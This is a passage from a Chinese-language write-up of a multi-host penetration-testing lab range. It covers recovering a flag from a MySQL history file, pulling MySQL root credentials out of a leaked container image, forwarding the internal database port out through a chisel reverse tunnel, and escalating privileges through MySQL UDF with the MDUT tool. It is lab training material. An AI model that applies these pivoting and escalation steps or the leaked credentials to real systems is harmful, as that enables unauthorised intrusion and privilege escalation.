<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">_HiStOrY_V2_</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show\040databases;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">create\040database\040flaghaha;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use\040flaghaha</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DROP\040TABLE\040IF\040EXISTS\040`f1ag`;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CREATE\040TABLE\040`flag06`\040(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`id`\040int\040DEFAULT\040NULL,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CREATE\040TABLE\040`flag06`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show\040tables;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drop\040table\040flag06;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DROP\040TABLE\040IF\040EXISTS\040`f1ag`;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CREATE\040TABLE\040`flag04`\040(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`id`\040int\040DEFAULT\040NULL,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CREATE\040TABLE\040`flag04`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">INSERT\040INTO\040`flag`\040VALUES\040(1,\040&#x27;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">INSERT\040INTO\040`flag04`\040VALUES\040(1,\040&#x27;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可读性较差，使用 <code>echo</code> 提升可读性</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">echo -ne $(cat .mysql_history)</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">_HiStOrY_V2_</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">databases</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">create</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token plain"> flaghaha</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">use</span><span class="token plain"> flaghaha </span><span class="token keyword" style="color:#00009f">DROP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">IF</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">EXISTS</span><span class="token plain"> </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">f1ag</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">flag06</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">id</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">f1agggggishere</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">varchar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ENGINE</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">MyISAM </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">CHARSET</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">utf8</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">flag06</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">id</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">f1agggggishere</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">varchar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ENGINE</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">MyISAM </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">CHARSET</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">utf8</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">tables</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">drop</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> flag06</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">DROP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">IF</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">EXISTS</span><span class="token plain"> </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">f1ag</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">flag04</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">id</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">f1agggggishere</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">varchar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ENGINE</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">MyISAM </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">CHARSET</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">utf8</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">flag04</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">id</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">f1agggggishere</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">varchar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ENGINE</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">MyISAM </span><span class="token keyword" style="color:#00009f">DEFAULT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">CHARSET</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">utf8</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">INSERT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">INTO</span><span class="token plain"> </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">flag</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">VALUES</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">INSERT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">INTO</span><span class="token plain"> </span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token identifier">flag04</span><span class="token identifier punctuation" style="color:#393A34">`</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">VALUES</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag---04">flag - 04<a href="#flag---04" class="hash-link" aria-label="flag - 04的直接链接" title="flag - 04的直接链接">​</a></h2>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{da69c459-7fe5-4535-b8d1-15fff496a29f}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172221437-mysql-udf-提权">172.22.14.37 Mysql UDF 提权<a href="#172221437-mysql-udf-提权" class="hash-link" aria-label="172.22.14.37 Mysql UDF 提权的直接链接" title="172.22.14.37 Mysql UDF 提权的直接链接">​</a></h2>
<p>在 <code>Harbor</code> 中，有 <code>project/projectadmin</code> 这个镜像，同样的方法获取下来进行分析，在其中的 jar 包中可以得到以下信息</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&amp;useUnicode=true&amp;serverTimezone=UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">spring.datasource.username=root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">spring.datasource.password=My3q1i4oZkJm3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后就可以尝试攻击 <code>172.22.10.28:3306</code> 这个 Mysql 服务</p>
<p>首先，先将 Mysql 服务转发出来</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">172.22.14.6</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.17:1337 R:0.0.0.0:10004:172.22.10.28:3306</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">:25:08 client: Connecting to ws://172.28.23.17:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">:25:08 server: session</span><span class="token comment" style="color:#999988;font-style:italic">#16: tun: proxy#R:10003=&gt;172.22.14.37:6443: Listening</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">:25:08 client: Connected </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Latency </span><span class="token number" style="color:#36acaa">48</span><span class="token plain">.219025ms</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后使用 <a href="https://github.com/SafeGroceryStore/MDUT" target="_blank" rel="noopener noreferrer">SafeGroceryStore/MDUT: MDUT - Multiple Database Utilization Tools</a> 进行利用</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240848-164826-bb888122d019797b92f97753c94a2e93.png" width="1204" height="1013" class="img_ev3q"></p>
<p>成功连接</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240848-164838-4685f5be1542581a84ef2f7a9b5f681f.png" width="1507" height="1283" class="img_ev3q"></p>
<p>执行 UDF 提权即可</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240849-164951-5a30102b50b74aaef00ab6d2463b02a9.png" width="1507" height="1283" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Yunjing/dimension/2024-GreatWall/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/Target-Machines-WriteUp/docs/category/YunjingDimension"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">多维挑战</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/Target-Machines-WriteUp/docs/Yunjing/dimension/Wangdingcup/"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">2022 - 网鼎杯半决赛复盘</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#入口点探测" class="table-of-contents__link toc-highlight">入口点探测</a></li><li><a href="#入口点-thinkphp-webshell" class="table-of-contents__link toc-highlight">入口点 ThinkPHP Webshell</a></li><li><a href="#flag---01" class="table-of-contents__link toc-highlight">flag - 01</a></li><li><a href="#内网扫描-1722823024" class="table-of-contents__link toc-highlight">内网扫描 172.28.23.0/24</a></li><li><a href="#1722823024-建立中转枢纽" class="table-of-contents__link toc-highlight">172.28.23.0/24 建立中转枢纽</a></li><li><a href="#172282333-springboot" class="table-of-contents__link toc-highlight">172.28.23.33 Springboot</a></li><li><a href="#172282333-二进制服务程序攻击" class="table-of-contents__link toc-highlight">172.28.23.33 二进制服务程序攻击</a></li><li><a href="#flag---03" class="table-of-contents__link toc-highlight">flag - 03</a></li><li><a href="#172282326-信息泄露" class="table-of-contents__link toc-highlight">172.28.23.26 信息泄露</a></li><li><a href="#172282326-webshell" class="table-of-contents__link toc-highlight">172.28.23.26 webshell</a></li><li><a href="#172282326-反弹-shell" class="table-of-contents__link toc-highlight">172.28.23.26 反弹 shell</a></li><li><a href="#172282326-suid-提权" class="table-of-contents__link toc-highlight">172.28.23.26 Suid 提权</a></li><li><a href="#flag---02" class="table-of-contents__link toc-highlight">flag - 02</a></li><li><a href="#172282326-探测环境" class="table-of-contents__link toc-highlight">172.28.23.26 探测环境</a></li><li><a href="#1722214024-双层内网建立中转枢纽" class="table-of-contents__link toc-highlight">172.22.14.0/24 双层内网建立中转枢纽</a></li><li><a href="#内网扫描-1722214024" class="table-of-contents__link toc-highlight">内网扫描 172.22.14.0/24</a></li><li><a href="#172221446-harbor-镜像泄露" class="table-of-contents__link toc-highlight">172.22.14.46 Harbor 镜像泄露</a></li><li><a href="#flag---05" class="table-of-contents__link toc-highlight">flag - 05</a></li><li><a href="#172221437-kubernetes" class="table-of-contents__link toc-highlight">172.22.14.37 Kubernetes</a></li><li><a href="#172221437-mysql-历史记录" class="table-of-contents__link toc-highlight">172.22.14.37 Mysql 历史记录</a></li><li><a href="#flag---04" class="table-of-contents__link toc-highlight">flag - 04</a></li><li><a href="#172221437-mysql-udf-提权" class="table-of-contents__link toc-highlight">172.22.14.37 Mysql UDF 提权</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox 🇨🇳 Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>